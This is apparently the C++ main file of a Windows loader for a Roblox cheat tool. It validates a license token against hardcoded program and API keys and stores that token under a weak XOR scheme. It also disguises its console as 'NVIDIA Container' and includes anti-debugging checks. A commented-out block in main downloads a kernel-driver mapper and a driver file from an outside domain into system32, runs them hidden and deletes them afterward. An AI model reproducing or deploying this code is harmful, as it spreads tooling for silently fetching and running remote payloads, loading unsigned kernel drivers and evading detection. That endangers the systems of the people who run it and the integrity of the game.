#include "library/web/web.h"
#include "library/s_auth/Sentinal.h"
#include "memory.h"
#include <fstream>
#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include "misc/globals/globals.hpp"
#include <WinInet.h>

const std::string LOGIN_FILE = "login.dat";
const char XOR_KEY = 0X73D;

std::string xor_encrypt(const std::string& data) {
    std::string encrypted_data = data;
    for (size_t i = 0; i < data.size(); ++i) {
        encrypted_data[i] = data[i] ^ XOR_KEY;
    }
    return encrypted_data;
}

std::string xor_decrypt(const std::string& encrypted_data) {
    return xor_encrypt(encrypted_data);
}

bool is_debugger_present_advanced() {
    return IsDebuggerPresent();
}

bool are_critical_functions_hooked() {

    FARPROC loadLibraryProc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    FARPROC getProcAddrProc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");

    if (loadLibraryProc == nullptr || getProcAddrProc == nullptr) {
        return true;
    }

    return false;
}

bool is_memory_manipulated() {
    MEMORY_BASIC_INFORMATION mbi;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    LPVOID address = nullptr;

    while (address < sysInfo.lpMaximumApplicationAddress) {
        if (VirtualQuery(address, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_WRITECOPY)) {

                return true;
            }
        }
        address = (LPVOID)((char*)address + mbi.RegionSize);
    }
    return false;
}

void protect_process() {
    HANDLE hProcess = GetCurrentProcess();
    DWORD processPriority = HIGH_PRIORITY_CLASS;
    SetPriorityClass(hProcess, processPriority);

    FreeConsole();

    // if (is_debugger_present_advanced()) {
    //     std::cerr << "Debugger detected! Terminating process." << std::endl;
    //     exit(EXIT_FAILURE);
    // }

    // if (are_critical_functions_hooked()) {
    //     std::cerr << "Suspicious hooks detected! Terminating process." << std::endl;
    //     exit(EXIT_FAILURE);
    // }

    // if (is_memory_manipulated()) {
    //     std::cerr << "Memory manipulation detected! Terminating process." << std::endl;
    //     exit(EXIT_FAILURE);
    // }

    std::cout << "Process protected." << std::endl;
}

void save_token(const std::string& token) {
    std::ofstream file(LOGIN_FILE, std::ios::binary);
    if (file.is_open()) {
        std::string encrypted_token = xor_encrypt(token);
        file.write(encrypted_token.c_str(), encrypted_token.size());
        file.close();
    }
}

bool load_token(std::string& token) {
    std::ifstream file(LOGIN_FILE, std::ios::binary);
    if (file.is_open()) {
        std::string encrypted_token((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        //       file.
        if (!encrypted_token.empty()) {
            token = xor_decrypt(encrypted_token);
            return true;
        }
    }
    return false;
}

void token_example() {
    std::string token;

    if (!load_token(token)) {

        std::cout << "Token : ";
        std::cin >> token;
        save_token(token);
        system("cls");
    }

    if (s_token(token)) {
        std::cout << "Successfully logged in!";
        RBX::Initializer();
    }
    else {
        std::cout << s_get_response();
    }
}

bool debug = globals::debug_info;
bool sigmaboi = false;

void authinit() {
    const std::string version = "1.2";
    const std::string program_key = "NByTUmRzeKUD1YQn3h6Cb6H3u42CjZCoGVexDA3We38";
    const std::string api_key = "f00a407973afc2dc9da4c592f7506075";

    s_init(version, program_key, api_key, true);
    token_example();
}

bool downloadFile(const std::string& url, const std::string& filename) {
    HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        return false;
    }

    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, 0, 0);
    if (hFile == NULL) {
        InternetCloseHandle(hInternet);
        return false;
    }

    std::ofstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, 1024, &bytesRead)) {
        if (bytesRead == 0) {
            break;
        }
        file.write(buffer, bytesRead);
    }

    file.close();
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return true;
}

bool executeCommandSilently(const std::string& command) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return false;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

bool deleteFile(const std::string& filename) {
    return DeleteFileA(filename.c_str()) != 0;
}

int main() {
    createConfigPath();
    utils::console::set_size(12);
    utils::console::enable_ansi();
    SetConsoleTitle("NVIDIA Container");
    utils::console::Set_RConsole(true);

    //std::string system32Dir = getenv("WINDIR");
    //system32Dir += "\\system32";

    //std::string mapperUrl = "https://donedrugs4.fun/mapper.exe";
    //std::string drvUrl = "https://donedrugs4.fun/drv.sys";

    //std::string mapperFilename = system32Dir + "\\mapper.exe";
    //std::string drvFilename = system32Dir + "\\drv.sys";

    //if (!downloadFile(mapperUrl, mapperFilename)) {
    //    std::cerr << "Failed to download mapper.exe" << std::endl;
    //    return 1;
    //}

    //if (!downloadFile(drvUrl, drvFilename)) {
    //    std::cerr << "Failed to download drv.sys" << std::endl;
    //    deleteFile(mapperFilename);
    //    return 1;
    //}

    //std::string command = mapperFilename + " " + drvFilename;
    //if (!executeCommandSilently(command)) {
    //    std::cerr << "Failed to execute files" << std::endl;
    //    deleteFile(mapperFilename);
    //    deleteFile(drvFilename);
    //    return 1;
    //}

    //if (!deleteFile(mapperFilename)) {
    //    std::cerr << "Failed to delete mapper.exe" << std::endl;
    //}

    //if (!deleteFile(drvFilename)) {
    //    std::cerr << "Failed to delete drv.sys" << std::endl;
    //}

    RBX::Initializer();

    return 0;
}